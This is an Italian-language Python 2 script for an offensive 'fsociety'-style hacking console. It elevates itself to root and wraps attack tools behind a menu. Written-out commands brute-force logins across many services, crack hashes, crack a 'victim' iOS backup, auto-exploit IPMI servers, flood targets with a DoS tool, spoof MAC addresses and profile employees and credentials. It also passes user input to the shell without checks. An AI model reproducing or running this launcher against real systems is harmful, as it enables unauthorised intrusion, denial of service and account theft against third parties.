#!/usr/bin/python
# coding: utf8
# Autore: Skull00
try:
    try:
        global end,red,blue,bright_green,bright_yellow,underline,Tools,Exploits,versione,autore
        end = '\033[0m'
        red = '\033[1;31m'
        blue = '\033[1;34m'
        bright_green = '\033[1;32m'
        bright_yellow = '\033[1;33m'
        underline = '\033[4m'
        Tools = red+"214"+end
        Exploits = red+"18"+end
        versione = red+"v2.0.1"+end
        autore = red+"Skull00"+end
        #
        import os,sys,time,readline,socket,requests,random,hashlib,platform,signal
        from time import sleep
        import struct # get gateway (+socket)
        import re, uuid # get mac address
        #
        import netifaces, httplib
        import urllib2, json # Geo-Location
    except ModuleNotFoundError:
        sys.exit("-# Usa python2 per avviare il programma")
    except KeyboardInterrupt:
        sys.exit("")
except ImportError:
    sys.exit("-# Esegui %sinstaller.py%s per avviare il programma"%(bright_green,end))
except NameError:
    sys.exit("-# Qualcosa Ã¨ andato storto...")

reload(sys)
sys.setdefaultencoding('utf8')

euid = os.geteuid()
if euid != 0:
    print("-# Permessi di root richiesti")
    try:
        time.sleep(.5)
    except KeyboardInterrupt:
        sys.exit("")
    args = ['sudo', sys.executable] + sys.argv + [os.environ]
    os.execlpe('sudo', *args) # this line replaces the currently-running process with the sudo

def get_gateway():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
def menu():
    def handler(signum, frame):
        os.system("clear")
        pid = os.getpid()
        if os.path.isfile("bin/banners.pyc"):
            os.system("rm bin/*.pyc")
        if os.path.isfile("output/fsociety/booted"):
            os.system("rm output/fsociety/booted")
        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=80))
        os.system("service postgresql stop && echo 0 > /proc/sys/net/ipv4/ip_forward")
        os.system("clear")
        print("\n-# Ctrl+Z rilevato, arresto forzato\n")
        os.system("kill -9 %s"%(pid))
        sys.exit()
    signal.signal(signal.SIGTSTP, handler)
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=28, cols=91))
    sys.stdout.write(end)
    class MyCompleter(object):  # Custom completer
        def __init__(self, options):
            self.options = sorted(options)
        def complete(self, text, state):
            if state == 0:  # on first trigger, build possible matches
                if text:  # cache matches (entries that start with entered text)
                    self.matches = [s for s in self.options
                                        if s and s.startswith(text)]
                else:  # no text entered, all matches possible
                    self.matches = self.options[:]
            # return match indexed by state
            try:
                return self.matches[state]
            except IndexError:
                return None
    commands_list = [
    "os","help","banner","search","restart","reload","stop","quit","exit","show",
    "exploits","tools","ifconfig","net_restart","netinfo",
    ]
    tools_list = [
    "nmap","netdiscover","amap","ciscotorch","eggshell","shellsploit","saint","koadic","hakkuf","weeman","arachni","xprobe",
    "geoip","whois","maltego","sn1per","red_hawk","ktfconsole","operativef","brutal","armitage","setoolkit","fatrat","parat",
    "dmitry","inspy","credmap","theharvester","pentestly","debinject","ciscoge","wole","xspy","findmyhash","gen2kr","netool",
    "xerxes","ufonet","zambie","goldeneye","recon-ng","sslscan","ipmipwn","vega","webscarab","thcssldos","owscan","dig",
    "xsstracer","pybomber","whatweb","commix","joomscan","hping3","miranda","snmpcheck","dhcpig","xsstrike","clusterd",
    "sqlmap","sshscan","pentmenu","a2sv","crips","vbscan","torshammer","siege","blackhydra","burpsuite","wafw00f","cupp",
    "brutesploit","medusa","jsql","dnsenum","dnsmap","dotdotpwn","metagoofil","sslyze","t50","nosqlmap","0trace","oscanner",
    "cpscan","dtect","sechub","wpscan","zaproxy","zenmap","uniscan","cutycapt","responder","hash-identifier","ophcrack",
    "droopescan","instarecon","dsxs","automater","intrace","smtpuserenum","angryfuzzer","dirbuster","sqldict","portscan",
    "xhydra","tulpar","bingoo","xattacker","knockmail","bluelog","fimap","infoga","dirb","nikto","fuckscrap",
    "blazy","xsssniper","sublist3r","urlextractor","breacher","ip2host","parsero","drup","jboss","eflood","intersect",
    "icloudbrutter","witchxtool","sfinder","hashbuster","devploit","skipfish","cr3dov3r","mitmap","onelin3r",
    "airgeddon","wifite","fakeauth","fluxion","wifiphisher","atscan","inguma","cdpsnarf","cookie-cadger","p0f",
    "routersploit","wirespy","wpsbreaker","netattack","httrack","lynis","searchsploit","printerspam","pcredz",
    "bettercap","morpheus","wireshark","ettercap","mitmf","penbox","simple-ducky","discover","zarp","sb0x",
    "sslstrip","voiphopper","driftnet","websploit","trity","dzjecter","cheetah","powerfuzzer","instaburst",
    "chaos","overthruster","arcanus","evildroid","ezsploit","zirikatu","microsploit","l0l","kayak","ioscrack",
    "astroid","kautilya","termineter","wifijammer","yersinia","hashcrack","darksploit","u3pwn","ngrok","dymerge",
    "socialfish","btscanner","brutex","angryip","zmap","v3n0m","torghost","macchanger","msfconsole","getip",
    "beelogger","wascan","wapiti","rkhunter","serenity","leviathan","cmospwd","pastezort","wig","webpwn3r",
    ]
    exploits_list = [
    "eternalblue","handler","webview","samba_pipename","shellshock","webdav","drupalgeddon","bluesnarfer","esteemaudit","jexboss",
    "samba_usermap","netapi","eternalromance","manageengine","joomla_comfields","tomcat_jsp","knox_smdm","unauth_rce"
    ]
    completer = MyCompleter(commands_list+tools_list+exploits_list)
    readline.set_completer(completer.complete)
    readline.parse_and_bind('tab: complete')
    if os.path.isfile("stash.sqlite"):
        os.system("mv stash.sqlite output/")
    try:
        command_input = raw_input("(FS) > ")
        if os.path.isfile("output/fsociety/booted") == False: # se uscito da un altro terminale
            os.system("echo 'file destinato al macello' > output/fsociety/booted")
            print("\n-# Servizi fermati da una shell differente")
            sys.stdout.write("-# Ricarico i servizi ")
            sys.stdout.flush()
            os.system("service postgresql start && echo 1 > /proc/sys/net/ipv4/ip_forward")
            sys.stdout.write("- %sOK%s\n\n"%(bright_green,end))
            sys.stdout.flush()
    except KeyboardInterrupt:
        try:
            print("\n-# Premi nuovamente Ctrl+C per uscire")
            time.sleep(.6)
            return menu()
        except KeyboardInterrupt:
            exit()
        except EOFError:
            print("\n\n-# (%s-%s) Errore insolito, smettila di cazzeggiare e datti da fare\n"%(red,end))
            return menu()
    except EOFError:
        print("\n-# (%s-%s) Usa 'exit', 'quit' o 'Ctrl+C' per uscire"%(red,end))
        return menu()
    tokens = command_input.split()
    try:
        command = tokens[0]
    except IndexError:
        command = None
    try:
        option = tokens[1]
    except IndexError:
        option = None
    try:
        argument = tokens[2]
    except IndexError:
        argument = None
    try:
        argument2 = tokens[3]
    except IndexError:
        argument2 = None
    try:
        argument3 = tokens[4]
    except IndexError:
        argument3 = None
    try:
        argument4 = tokens[5]
    except IndexError:
        argument4 = None
    args = tokens[1:]
    os_cmds = ["service","ftp","ssh","echo","ifconfig","ping","clear","reset","wget","git","apt","mkdir","rm","nano","sudo","touch","man","ls","dpkg","cat","mv","cp","ps","kill"]
    if command in os_cmds:
        print(" > %s$%s %s\n"%(bright_green,end, command_input))
        os.system(command_input)
        print("")
        return menu()
    elif command == 'help' or command == '?':
        help()
    elif command == "show" or command == "tools" or command == "exploits":
        if command == "tools": show_tools()
        if command == "exploits": show_exploits()
        if option:
            if "tools" in option: show_tools()
            if "exploits" in option: show_exploits()
            else: print("-# show: tools / exploits")
        else:
            print("-# show: tools / exploits")
        return menu()
    elif command == 'logo' or command == 'banner':
        banner()
        return menu()
    elif command == "netinfo":
        try:
            localip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
        except socket.error:
            localip = "-"
        try:
            publicip = requests.get('http://ip.42.pl/raw').text
        except requests.exceptions.ConnectionError:
            publicip = "-"
        except KeyboardInterrupt:
            print("")
            return menu()
        try:
            iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        except KeyError:
            iface = "-"
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        print("\n --+=[ %sConnessioni stabilite%s: \n"%(bright_green,end))
        os.system("netstat -natu | grep 'ESTABLISHED'")
        print("\n --+=[ %sInformazioni di rete%s: \n"%(bright_green,end))
        print("-# IP Locale   > %s"%(localip))
        print("-# IP Pubblico > %s"%(publicip))
        print("-# Interfaccia > %s"%(iface))
        print("-# Mac         > %s (permanent)"%(mac))
        print("-# Gateway     > %s"%(str(get_gateway())))
        print("")
        return menu()
    elif command == "search":
        if option:
            incms = []
            if option in tools_list:
                print("\n-# %s installato\n"%(bright_green+option+end))
                return menu()
            if option not in tools_list:
                print("\n-# %s non installato"%(bright_green+option+end))
            for e in tools_list:
                if "%s"%option in e:
                    incms.append(e)
            res = "risultati simili"
            if len(incms) == 1:
                res = "risultato simile"
            if len(incms) != 0:
                print("-# %s %s:"%(len(incms), res))
                for e in incms:
                    print(" %s-%s %s"%(bright_green,end, e))
                print("")
            else:
                print("-# Nessun risultato simile\n")
        else:
            print("-# Uso: $ search <nome tool>")
        return menu()
    elif command == 'restart':
        sys.stdout.write("-# Fermo i servizi ")
        sys.stdout.flush()
        os.system("service postgresql stop && echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.stdout.write("- %sOK%s\n"%(bright_green,end))
        sys.stdout.flush()
        try:
            time.sleep(.2)
        except KeyboardInterrupt:
            pass
        os.system("rm output/fsociety/booted")
        os.system("clear")
        os.system("fsociety")
        sys.exit()
    elif command == 'reload':
        sys.stdout.write("-# Ricarico i servizi ")
        sys.stdout.flush()
        os.system("service postgresql restart && echo 1 > /proc/sys/net/ipv4/ip_forward")
        sys.stdout.write("- %sOK%s\n"%(bright_green,end))
        sys.stdout.flush()
        return menu()
    elif command == 'stop':
        sys.stdout.write("-# Fermo i servizi ")
        sys.stdout.flush()
        os.system("service postgresql stop && echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.stdout.write("- %sOK%s\n"%(bright_green,end))
        sys.stdout.flush()
        return menu()
    elif command == 'exit' or command == 'quit':
        exit()
    elif command == 'os':
        if option == None:
            print("-# %sos%s esegue il comando a seguire nel terminale"%(blue,end))
            return menu()
        osc = command_input.replace("os ","")
        print(" > %s$%s %s\n"%(bright_green,end, osc))
        os.system(osc)
        print("")
        return menu()
    elif command == 'net_restart':
        os.system("service network-manager restart")
        print("(%sOK%s) > Servizio 'network-manager' riavviato"%(bright_green,end))
        return menu()
    elif command == "getip":
        try:
            requests.get("https://www.google.com")
        except requests.exceptions.ConnectionError:
            print("-# (%s-%s) Nessuna connessione"%(red,end))
            return menu()
        except KeyboardInterrupt:
            print("")
            return menu()
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            try:
                print("-# IP: "+bright_green+socket.gethostbyname("%s"%(option))+end)
            except socket.gaierror:
                print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
        else:
            print("-# Uso: getip <indirizzo>")
        return menu()
    elif command == "dig":
        if option:
            print("")
            os.system("dig +noall +answer -x %s"%(option))
            print("")
        else:
            print("-# Uso: $ dig <indirizzo>")
        return menu()
    elif command == 'macchanger':
        if option:
            macs = ["0a:62:e5:43:83:af","5e:39:94:0b:af:82","e6:97:42:35:bb:0f","e6:27:ac:6d:8e:27","42:31:7c:c0:7e:e6","52:70:c6:c1:61:82","ee:68:b2:74:fa:27","9e:1b:a9:ee:10:d8","72:c9:43:c7:b3:7b"]
            mac = random.choice(macs)
            os.system("service network-manager stop && ifconfig %s hw ether %s && service network-manager start"%(option, mac))
            print("(%sOK%s) > Indirizzo MAC cambiato (%s)"%(bright_green,end, option))
        else:
            print("\n-# Cambia indirizzo MAC dell'interfaccia digitata")
            print("-# Uso: $ macchanger <interfaccia>\n")
        return menu()
    elif command == 'torghost':
        if option:
            if option == 'start':
                os.system("xterm -T 'TorGhost' -e 'torghost start'")
                print("(%sOK%s) > TorGhost Avviato"%(bright_green,end))
            elif option == 'stop':
                os.system("xterm -T 'TorGhost' -e 'torghost stop'")
                print("(%sOK%s) > TorGhost Fermato"%(bright_green,end))
            else:
                print("-# (%s-%s) Argomento non valido"%(red,end))
        else:
            print("\n-# Rimani anonimo mascherando il tuo indirizzo IP")
            print("-# Uso: $ torghost <start/stop>\n")
        return menu()
    elif command == 'ioscrack':
        if option:
            if option == 'auto':
                os.system("cd tools/iOSRestrictionBruteForce/ && python ioscrack.py -a -v")
                print("")
                return menu()
            if 'auto' not in option:
                os.system("cd tools/iOSRestrictionBruteForce/ && python ioscrack.py -b %s -v"%(option))
                print("")
                return menu()
        else:
            print("")
            print("-# %sAttenzione%s:"%(bright_yellow,end))
            print("   Se iTunes Ã¨ installato esegui il backup del dispositivo vittima e avvia ioscrack con")
            print("   $ ioscrack auto.")
            print("   Se iTunes non Ã¨ installato inserisci manualmente la cartella di backup con")
            print("   $ ioscrack /path/to/backup/folder.")
            print("")
            print("-# Uso: $ ioscrack <auto / [path/to/backup/folder]> ")
            print("")
            return menu()
    elif command == 'cheetah':
        if option:
            command = "cd tools/cheetah/ && python cheetah.py -u %s"%(option)
            if argument:
                if os.path.exists(argument) == False:
                    print("-# (%s-%s) File non trovato"%(red,end))
                    return menu()
                command = "cd tools/cheetah/ && python cheetah.py -u %s -p %s"%(option, argument)
            os.system(command)
            print("")
        else:
            print("\n-# Attacca tramite bruteforce una pagina di login")
            print("-# Uso: $ cheetah <target> [/full/path/to/wordlist.txt]\n")
        return menu()
    elif command == 'medusa':
        modules_list = ["afp","cvs","ftp","http","imap","mssql","mysql","nntp","pop3","postgres","rdp","rexec","rsh","smbnt","ssh","svn","telnet","vmauthd","vnc","wrapper"]
        if option:
            host = option
            if argument:
                user = argument
                if argument2: # psw file
                    if os.path.exists(argument2) == False:
                        print("-# (%s-%s) File non trovato"%(red,end))
                        return menu()
                    wordlist = argument2
                    if argument3:
                        if argument3 in modules_list:
                            module = argument3
                            command = "xterm -T 'Medusa' -e 'medusa -h %s -u %s -P %s -M %s;echo '';echo Press ENTER To Close;read'"%(host, user, wordlist, module)
                            if argument4:
                                threads = argument4
                                try:
                                    if int(threads):
                                        pass
                                except ValueError:
                                    print("-# (%s-%s) Numero di tentativi non valido"%(red,end))
                                    return menu()
                                command = "xterm -T 'Medusa' -e 'medusa -h %s -u %s -P %s -M %s -t %s;echo '';echo Press ENTER To Close;read'"%(host, user, wordlist, module, threads)
                            os.system(command)
                        else:
                            print("-# (%s-%s) Modulo non valido"%(red,end))
                    else:
                        print("-# (%s-%s) Modulo mancante"%(red,end))
                else:
                    print("-# (%s-%s) Wordlist mancante"%(red,end))
            else:
                print("-# (%s-%s) Utente mancante"%(red,end))
        else:
            print("\n-# Un bruteforcer per quasi ogni tipo di modulo                              \n")
            print("-# %sModuli%s:                                                                   "%(bright_green,end))
            print("-# afp / cvs / smbnt / http / svn / mysql / nntp / postgres / rdp / wrapper      ")
            print("-# rsh / ftp / mssql / imap / ssh / rexec / pop3 / vmauthd  / vnc / telnet       ")
            print("\n-# Uso: $ medusa <host> <user> <pswdfile.txt> <module> [threads n. (facoltativo)]\n")
        return menu()
    elif command == 'findmyhash':
        hash_list = ["MD4","MD5","SHA1","SHA224","SHA256","SHA384","SHA512","RMD160","GOST","WHIRLPOOL","LM","NTLM","MYSQL","CISCO7","JUNIPER","LDAP_MD5","LDAP_SHA1"]
        if option:
            if option not in hash_list:
                print("-# (%s-%s) Algoritmo non valido"%(red,end))
                return menu()
            if argument:
                os.system("findmyhash %s -h %s"%(option, argument))
                return menu()
            else:
                print("-# (%s-%s) Hash mancante"%(red,end))
                return menu()
        else:
            print("\n-# Hash-Cracker                                                          \n")
            print("-# %sAlgoritmi%s:"%(bright_green,end))
            print("-# MD4 / SHA1 / SHA224 / SHA512 / RMD160 / WHIRLPOOL / LDAP_MD5 / GOST  / LM ")
            print("-# MD5 / NTLM / SHA256 / SHA384 / CISCO7 / LDAP_SHA1 / JUNIPER  / MYSQL      ")
            print("                                                                             ")
            print("-# Uso: $ findmyhash <algoritmo> <hash>")
            print("                                                                             ")
            return menu()
    elif command == 'hash-identifier':
        print("")
        os.system("hash-identifier")
        logo_menu()
    elif command == 'hashcrack':
        wdl_alg_list = ["md5","sha1","sha224","sha256","sha384","sha512"]
        nowdl_alg_list = ["md4","md5","sha1","sha224","sha256","sha384","sha512","juniper","lm","ntlm","whirlpool","rmd160","gost","mysql","cisco7","ldap_md5","ldap_sha1"]
        wordlist = None # default
        def hashcrack(algorithm, hash, wordlist):
            linecount = 0
            start = time.time()
            if algorithm == "md5":
                h = hashlib.md5
            elif algorithm == "sha1":
                h = hashlib.sha1
            elif algorithm == "sha224":
                h = hashlib.sha224
            elif algorithm == "sha256":
                h = hashlib.sha256
            elif algorithm == "sha384":
                h = hashlib.sha384
            elif algorithm == "sha512":
                h = hashlib.sha512
            if wordlist == None:
                # without wordlist
                os.system("findmyhash %s -h %s"%(algorithm,hash))
                return menu()
            if wordlist != None:
                if algorithm not in wdl_alg_list:
                    print("-# (%s-%s) Algoritmo non supportato o non valido"%(red,end))
                    return menu()
                with open(wordlist, 'r') as encrypter:
                    print("")
                    for data in encrypter:
                        data = data.split()
                        for line in data:
                            #print line
                            try:
                                crypt = h(line).hexdigest()
                                sys.stdout.write('\r' + " > Parola Testata: " + str(line) + " " * 20)
                                sys.stdout.flush()
                                linecount += 1
                            except (KeyboardInterrupt,EOFError):
                                sys.exit("\n\n-# Interrotto")
                            if hash == crypt:
                                end_ = time.time()
                                print("\n")
                                print("(%s) Tempo Trascorso / %s secondi"%(bright_yellow+"*"+end, round((end_-start), 2)))
                                print("(%s) Parole Testate  / %s"%(bright_yellow+"*"+end, linecount))
                                print("(%s) Hash            / %s"%(bright_green+"+"+end, hash))
                                print("(%s) Testo Originale / %s\n"%(bright_green+"+"+end, line))
                                return menu()
                end_ = time.time() # if failed
                print("\n\n(%s) Parole Testate  / %s"%(bright_yellow+"*"+end, linecount))
                print("(%s) Tempo Trascorso / %s secondi"%(bright_yellow+"*"+end, round((end_-start), 2)))
                print("(%s) Nessun Risultato\n"%(red+"-"+end))
                return menu()
        if option: # algorithm
            if option not in nowdl_alg_list:
                print("-# (%s-%s) Algoritmo non supportato o non valido"%(red,end))
                return menu()
            if argument: # hash
                algorithm = option
                hash = argument # hashSpecificato
                if argument2: # wordlist
                    wordlist = argument2 # wordlistSpecificata
                    if os.path.exists(wordlist) == False:
                        print("-# (%s-%s) File non trovato"%(red,end))
                        return menu()
                hashcrack(algorithm, hash, wordlist)
            else: # hash
                print("-# (%s-%s) Hash richiesto"%(red,end))
                return menu()
        else: # option
            print("                                                                             ")
            print("-# %sAlgoritmi Supportati con Wordlist%s:                                    "%(bright_green,end))
            print("-# md5 / sha1 / sha224 / sha256 / sha384 / sha512                            ")
            print("                                                                             ")
            print("-# %sAlgoritmi Supportati%s:                                                 "%(bright_green,end))
            print("-# md4 / md5 / sha1 / sha224 / sha256 / sha384 / sha512   / juniper   / lm   ")
            print("-# whirlpool / rmd160 / gost / mysql  / cisco7 / ldap_md5 / ldap_sha1 / ntlm ")
            print("                                                                             ")
            print("-# Uso: $ hashcrack <algoritmo> <hash> [wordlist.txt]                        ")
            print("                                                                             ")
            return menu()
    elif command == "gen2kr":
        if option:
            os.system("touch output/fs_tmp_wd.txt")
            text = option
            output = argument
            if output == None:
                print("-# (%s-%s) Nessun file di output specificato"%(red,end))
                return menu()
            if ".txt" not in output:
                output = output + ".txt"
            if "," not in text:
                if ".txt" not in text:
                    command = "cd tools/Gen2kr && ./gen2kr -w ../../output/fs_tmp_wd.txt -o ../../output/%s -c -n -y -z"%(output)
                    os.system("echo %s > output/fs_tmp_wd.txt"%(text))
                if ".txt" in text:
                    if os.path.exists(text) == False:
                        print("-# (%s-%s) File di input non trovato"%(red,end))
                        return menu()
                    command = "cd tools/Gen2kr && ./gen2kr -w %s -o ../../output/%s -c -n -y -z"%(text, output)
            if "," in text:
                text = text.split(",")
                f = open("output/fs_tmp_wd.txt","w")
                f.write("\n".join(s for s in text))
                f.close()
                command = "cd tools/Gen2kr && ./gen2kr -w ../../output/fs_tmp_wd.txt -o ../../output/%s -c -n -y -z"%(output)
            print("")
            os.system(command)
            os.system("rm output/fs_tmp_wd.txt")
            print("[%s+%s] Wordlist creata in output/%s\n"%(bright_green,end,output))
            return menu()
        else:
            print("\n-# Wordlist Generator")
            print("-# Uso: $ gen2kr <[/full/path/to/inputfile.txt]/testo[,testo,...]> <output.txt>\n")
            return menu()
    elif command == "hashbuster":
        print("")
        os.system("cd tools/Hash-Buster/ && python hash.py")
        print("")
        return menu()
    elif command == 'msfconsole':
        os.system(command_input)
        print("")
        return menu()
    elif command == 'nmap':
        if option:
            if "https://" in command_input:
                command_input = command_input.replace("https://","")
            if "http://" in command_input:
                command_input = command_input.replace("http://","")
            print("")
            os.system(command_input)
            print("")
        else:
            print("\n-# Scanner universale per porte, indirizzi, sistemi e altro ancora")
            print("-# Il comando Ã¨ personalizzabile, usa 'nmap -h' per la lista intera")
            print("-# Uso: $ nmap <comando>\n")
        return menu()
    elif command == 'netdiscover':
        os.system("netdiscover -p")
        print("")
        return menu()
    elif command == 'geoip':
        if option:
            try:
                requests.get("https://www.google.com")
            except requests.exceptions.ConnectionError:
                print("-# (%s-%s) Errore di connessione"%(red,end))
                return menu()
            except KeyboardInterrupt:
                print("-# Interrotto")
                return menu()
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option: option = option.replace("http://","")
                    if "https://" in option: option = option.replace("https://","")
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
                return menu()
            url = "http://ip-api.com/json/"
            try:
                response = urllib2.urlopen(url + getip)
            except httplib.BadStatusLine:
                print("-# (%s-%s) Richiesta scaduta. Riprova"%(red,end))
                return menu()
            except KeyboardInterrupt:
                print("\n-# Interrotto\n")
                return menu()
            data = response.read()
            values = json.loads(data)
            ip = getip #values['query']
            socket.inet_aton(ip)
            hostname = socket.getfqdn(ip)
            if hostname == ip: hostname = ""
            try: country = values['country']
            except KeyError: country = ""
            try:
                countrycode = values['countryCode']
                countrycode = "(%s)"%(countrycode)
            except KeyError:
                countrycode = ""
            try: region_name = values['regionName']
            except KeyError: region_name = ""
            try:
                region = values['region']
                region = "(%s)"%(region)
            except KeyError:
                region = ""
            try: city = values['city']
            except KeyError: city = ""
            try: zip_code = values['zip']
            except KeyError: zip_code = ""
            try: isp = values['isp']
            except KeyError: isp = ""
            try: org = values['org']
            except KeyError: org = ""
            try: gestore = values['as']
            except KeyError: gestore = ""
            try: lat_lon = str(values['lat']) + " / " + str(values['lon'])
            except KeyError: lat_lon = ""
            try: timezone = values['timezone']
            except KeyError: timezone = ""
            try: maps = "https://www.google.com/maps/search/?api=1&query=%s,%s"%(str(values['lat']), str(values['lon']))
            except KeyError: maps = ""
            print("""
         ____             _
        |___ \ ___   ___ (_) __ _
         _  | / _ \ / _ \| |/ _` | -# Skull00
        | |_| \__  | (_) | | (_| |
        |____/|___/ \___/|_|\__, |
                               |_|
            """)
            print(" %sIP%s        > %s"%(bright_green,end, ip))
            print(" %sHostname%s  > %s"%(bright_green,end, hostname))
            print(" %sNazione%s   > %s %s"%(bright_green,end, country, countrycode))
            print(" %sRegione%s   > %s %s"%(bright_green,end, region_name, region))
            print(" %sC.Postale%s > %s"%(bright_green,end, zip_code))
            print(" %sCittÃ %s     > %s"%(bright_green,end, city))
            print(" %sProvider%s  > %s"%(bright_green,end, isp))
            print(" %sOrganizz.%s > %s"%(bright_green,end, org))
            print(" %sGestore%s   > %s"%(bright_green,end, gestore))
            print(" %sLat/Long%s  > %s"%(bright_green,end, lat_lon))
            print(" %sF.Orario%s  > %s"%(bright_green,end, timezone))
            print(" %sG.Maps%s    > %s"%(bright_green,end, maps))
            print("")
            if argument == "--portscan":
                portscan(ip)
        else:
            print("\n-# Geolocalizzatore")
            print("-# Uso: $ geoip <indirizzo> [--portscan]\n")
        return menu()
    elif command == 'whois':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option:
                        option = option.replace("http://","")
                    if "https://" in option:
                        option = option.replace("https://","")
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
                return menu()
            option = getip
            os.system("whois -H %s"%(option))
            return menu()
        else:
            print("\n-# Geolocalizzatore")
            print("-# Uso: $ whois <indirizzo>\n")
            return menu()
    elif command == 'maltego':
        print("-# Attendi l'avvio")
        os.system("open maltego")
        return menu()
    elif command == 'sn1per':
        if option:
            print("")
            os.system("cd tools/Sn1per/ && ./sniper -t %s -o -re"%(option))
            print("")
            return menu()
        else:
            print("\n-# All-in-one scanner")
            print("-# Uso: $ sn1per <indirizzo>\n")
            return menu()
    elif command == 'dmitry':
        if option:
            print("")
            os.system("dmitry %s -i -w -p -e -o output/dmitry_log"%(option))
            print("\n-# Informazioni salvate in %soutput/dmitry_log.txt%s\n"%(blue,end))
            return menu()
        else:
            print("\n-# Cerca informazioni su un indirizzo come email, porte aperte e altro ancora")
            print("-# Uso: $ dmitry <indirizzo>\n")
            return menu()
    elif command == 'red_hawk' or command_input == 'red hawk':
        os.system("cd tools/RED_HAWK/ && php rhawk.php")
        logo_menu()
    elif command == 'ktfconsole' or command == 'ktf':
        os.system("ktf.console")
        logo_menu()
    elif command == 'operativef' or command == 'operative':
        os.system("cd tools/operative-framework/ && python operative.py")
        logo_menu()
    elif command == 'inspy':
        if option:
            if argument:
                job_list = option.split()
                print("")
                for elements in job_list:
                    os.system('echo "%s" > output/inspy.txt'%(elements))
                    print("(%sRicerca%s) > %s%s%s"%(bright_green,end, bright_green,elements,end))
                os.system("inspy --empspy output/inspy.txt %s"%(argument))
                os.system("rm output/inspy.txt")
                print("")
                return menu()
            else:
                print("-# (%s-%s) Luogo richiesto"%(red,end))
        else:
            print("\n-# Cerca un impiegato tramite mestiere e luogo (es: $ inspy CEO Torino)")
            print("-# Uso: $ inspy <mestiere> <luogo>\n")
        return menu()
    elif command == 'tulpar':
        modules_list = ["links","e-mail","sql","xss","crawl","whois"]
        if option:
            if argument:
                if argument not in modules_list:
                    print("-# (%s-%s) Modulo non valido"%(red,end))
                    return menu()
                target = option
                if 'http://' not in target:
                    if "https://" in target:
                        pass
                    else:
                        target = "http://"+target
                print("")
                os.system("cd tools/tulpar/ && python tulpar.py %s %s"%(argument,target))
                print("")
            else:
                print("-# (%s-%s) Modulo richiesto"%(red,end))
        else:
            print("\n-# Ricava informazioni tramite i moduli (sql e xss per cercare vulnerabilitÃ )\n")
            print("-# %sModuli%s:                                  "%(bright_green,end))
            print("-# links / e-mail / sql / xss / crawl / whois   ")
            print("                                                ")
            print("-# Uso: $ tulpar <indirizzo> <modulo>           ")
            print("                                                ")
        return menu()
    elif command == 'credmap':
        if option:
            os.system("cd tools/credmap && python credmap.py --email %s"%(option))
            print("")
        else:
            print("\n-# Testa un nome utente / email in diversi siti")
            print("-# Uso: $ credmap <username/email>\n")
        return menu()
    elif command == 'theharvester':
        if option:
            target = option
            if "http://" in option:
                target = option.replace("http://","")
            if "https://" in option:
                target = option.replace("https://","")
            if "www." in option or "www." in target:
                target = option.replace("www.","")
            os.system("theharvester -d %s -b all -v -n -t"%(target))
            print("")
            return menu()
        else:
            print("\n-# Cerca informazioni tramite un indirizzo (email,hosts,...)")
            print("-# Uso: $ theharvester <indirizzo>\n")
            return menu()
    elif command == "dzjecter":
        os.system("Dzjecter")
        logo_menu()
    elif command == 'ipmipwn':
        if option:
            os.system("cd tools/IPMIPWN/ && python ipmipwn.py %s"%(option))
            return menu()
        else:
            print("\n-# Auto-Exploiter per la vulnerabilitÃ  'cipher 0', l'indirizzo deve avere la porta")
            print("   623 aperta")
            print("-# Uso: $ ipmipwn <indirizzo>\n")
            return menu()
    elif command == 'intrace':
        if option:
            port = 80
            if 'https://' in option:
                port = 443
                option = opiton.replace("https://","")
            if "http://" in option:
                option = option.replace("http://","")
            os.system("intrace -h %s -p %s -s 4"%(option, port))
            print("\n")
        else:
            print("\n-# Resta in ascolto dei pacchetti trasmessi da un indirizzo")
            print("-# Uso: $ intrace <indirizzo>\n")
        return menu()
    elif command == 'miranda':
        print("\n-# Scopri, identifica e interagisci con dispositivi UPNP\n")
        os.system("miranda")
        return menu()
    elif command == 'powerfuzzer':
        print("-# Attendi l'avvio")
        os.system("open powerfuzzer")
        return menu()
    elif command == 'burpsuite':
        print("-# Attendi l'avvio")
        os.system("open burpsuite")
        return menu()
    elif command == "brutex":
        if option:
            port = 80
            if "https://" in option:
                port = 443
            if argument:
                try:
                    if int(argument) < 1 or int(argument) > 65535:
                        print("-# (%s-%s) Porta non valida"%(red,end))
                        return menu()
                except ValueError:
                    print("-# (%s-%s) Porta non valida"%(red,end))
                    return menu()
                port = argument
            print("")
            os.system("cd tools/BruteX/ && ./brutex %s %s"%(option, port))
            print("")
        else:
            print("\n-# Attacco bruteforce a pagine di login con username e password piÃ¹ comuni")
            print("-# Uso: $ brutex <indirizzo> [porta]\n")
        return menu()
    elif command == 'xerxes':
        if option:
            os.system("xterm -T 'Xerxes' -e './tools/xerxes/xerxes %s 80'"%(option))
        else:
            print("\n-# Stress Tester")
            print("-# Uso: $ xerxes <indirizzo>\n")
        return menu()
